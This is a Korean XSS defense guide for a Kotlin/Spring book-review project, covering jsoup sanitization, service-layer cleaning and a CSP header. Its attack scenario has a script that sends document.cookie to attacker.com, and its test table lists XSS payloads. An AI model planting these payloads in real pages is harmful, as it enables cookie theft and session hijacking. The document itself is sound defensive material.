# 🛡️ XSS 방어 가이드

## ❌ 발견된 취약점

### 1. **th:utext 사용으로 인한 XSS 취약점**
```html
<!-- ❌ 위험 -->
<div th:utext="${review.content}">
```

**문제점:**
- 사용자가 `<script>alert('XSS')</script>` 입력 시 그대로 실행됨
- 쿠키 탈취, 세션 하이재킹 가능
- 다른 사용자에게도 영향 (Stored XSS)

**공격 시나리오:**
```javascript
// 악의적 사용자가 리뷰에 입력:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// 다른 사용자가 해당 리뷰를 볼 때마다 쿠키 탈취됨
```

---

## ✅ 적용된 보안 조치

### 1. **서버 사이드 HTML 새니타이즈 (jsoup)**

#### build.gradle.kts
```kotlin
implementation("org.jsoup:jsoup:1.17.2")
```

#### HtmlSanitizer.kt

> ⚠️ 허용 태그·속성 목록은 코드가 바뀔 때마다 갱신되므로 이 문서에 스니펫을 복사하지 않는다.
> 정본은 [`src/main/kotlin/com/woocurlee/bookview/util/HtmlSanitizer.kt`](src/main/kotlin/com/woocurlee/bookview/util/HtmlSanitizer.kt) 참고.

`Safelist.relaxed()`를 기반으로 아래와 같이 확장/제한한다 (자세한 값은 코드 참고):
- 허용 태그 추가: 제목(`h1`~`h6`), 취소선(`s`)
- 허용 속성 추가: `p`/`span`의 `class`
- 허용 프로토콜 제한: `a[href]`는 `http`/`https`/`mailto`만, `img[src]`는 `http`/`https`만 (`javascript:`, `data:` 등 차단)

**차단되는 태그/속성 (기본 Safelist 정책):**
- `<script>` - JavaScript 실행
- `<iframe>` - 외부 사이트 임베드
- `<object>`, `<embed>` - 플러그인 실행
- `onclick`, `onerror` 등 이벤트 핸들러

### 2. **ReviewService 새니타이즈 적용**

> 정본은 [`src/main/kotlin/com/woocurlee/bookview/service/ReviewService.kt`](src/main/kotlin/com/woocurlee/bookview/service/ReviewService.kt)의 `createReview`, `updateReview` 참고.

- `title`, `quote`: `HtmlSanitizer.toPlainText()`로 HTML 전부 제거
- `content`: `HtmlSanitizer.sanitize()`로 허용된 태그만 유지
- 생성/수정 모두 저장 직전(save 호출 전)에 새니타이즈하여, DB에는 항상 안전한 값만 저장됨

### 3. **Content-Security-Policy 응답 헤더 (2차 방어선)**

> 정본은 [`src/main/kotlin/com/woocurlee/bookview/config/SecurityConfig.kt`](src/main/kotlin/com/woocurlee/bookview/config/SecurityConfig.kt)의 `contentSecurityPolicy` 참고.

새니타이저 허용 목록에 구멍이 생기거나 다른 경로로 스크립트가 주입되더라도 브라우저가 실행 자체를 막도록, 모든 응답에 CSP 헤더를 내려준다.

- `script-src`: `'self'`와 실제로 쓰는 CDN(Tailwind, GA, TipTap)만 허용하며 **`'unsafe-inline'`이 없다**. 주입된 인라인 `<script>`나 `onerror=` 같은 이벤트 핸들러는 실행되지 않고, 허용 목록에 없는 외부 도메인에서 스크립트를 불러오는 것도 차단된다.
- `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `frame-ancestors 'none'`으로 플러그인 실행·base 태그 변조·클릭재킹을 함께 막는다.
- `style-src`에는 `'unsafe-inline'`이 남아 있다. Tailwind를 CDN 런타임으로 쓰는 동안은 제거할 수 없다(스타일 인라인은 코드 실행이 불가능해 위험도가 낮다).

**프론트엔드 작업 시 지켜야 할 제약** — 아래를 어기면 해당 기능이 조용히 동작하지 않는다:
- 인라인 `<script>`를 쓰지 않는다. 스크립트는 `static/js/` 아래 파일로 두고 `src`로 불러온다.
- `onclick=`, `onerror=` 같은 HTML 이벤트 핸들러 속성을 쓰지 않는다. `data-action` 속성을 붙이고 JS에서 `addEventListener`로 연결한다.
- 서버 값은 `data-*` 속성이나 `<script type="application/json">` 데이터 아일랜드로 전달한다(JSON 블록은 실행 대상이 아니라 CSP 영향을 받지 않는다).
- 이미지 로드 실패 폴백은 `data-fallback` 속성 + `static/js/cover-fallback.js`를 사용한다.
- `href="javascript:..."` 링크를 쓰지 않는다.

---

## 🔍 보안 레이어

### **다층 방어 (Defense in Depth)**

```
사용자 입력
    ↓
┌─────────────────────────────────┐
│ 1. 클라이언트 검증 (UX용)       │  ← 쉽게 우회 가능
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 2. 서버 검증 + HTML 새니타이즈  │  ✅ 핵심 방어선
│    (ReviewService)              │
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 3. 데이터베이스 저장             │  ← 이미 안전한 데이터
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 4. 렌더링 (th:utext)            │  ← 안전한 HTML만 존재
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 5. 브라우저 CSP 헤더            │  ← 앞 단계가 뚫려도 실행 차단
│    (SecurityConfig)             │
└─────────────────────────────────┘
```

---

## 🧪 테스트 케이스

### **악의적 입력 예시**

| 입력 | 새니타이즈 후 | 설명 |
|------|--------------|------|
| `<script>alert('XSS')</script>` | (제거됨) | 스크립트 차단 |
| `<img src=x onerror=alert('XSS')>` | `<img src="x">` | 이벤트 핸들러 제거 |
| `<a href="javascript:alert('XSS')">Click</a>` | `<a>Click</a>` | javascript: 프로토콜 차단 |
| `<img src="javascript:alert('XSS')">` | `<img>` | javascript: 프로토콜 차단 |
| `<p onclick="alert('XSS')">Text</p>` | `<p>Text</p>` | onclick 제거 |
| `<iframe src="https://evil.com"></iframe>` | (제거됨) | iframe 차단 |
| `<strong>Bold</strong>` | `<strong>Bold</strong>` | ✅ 안전한 태그 허용 |

---

## 📋 진행 현황

보안 조치 항목별 완료 여부는 문서가 아닌 Jira에서 관리한다 (문서 드리프트 방지).

---

## 🎯 결론

### **적용 전 (취약)**
```kotlin
// 사용자 입력 그대로 저장
reviewRepository.save(review)
```
```html
<!-- 위험한 렌더링 -->
<div th:utext="${review.content}">
```

### **적용 후 (안전)**
```kotlin
// 저장 전 새니타이즈
val sanitized = review.copy(
    content = HtmlSanitizer.sanitize(review.content)
)
reviewRepository.save(sanitized)
```
```html
<!-- 이미 안전한 HTML이므로 th:utext 사용 가능 -->
<div th:utext="${review.content}">
```

**핵심 원칙:**
- ✅ 사용자 입력은 절대 신뢰하지 않는다
- ✅ 서버에서 검증/새니타이즈
- ✅ 다층 방어 전략
- ✅ 템플릿에 인라인 스크립트·이벤트 핸들러를 넣지 않는다 (CSP `script-src`가 차단)
- ✅ 허용 태그·속성 목록의 정본은 코드(`HtmlSanitizer.kt`)이며, 이 문서는 스니펫을 복사하지 않는다
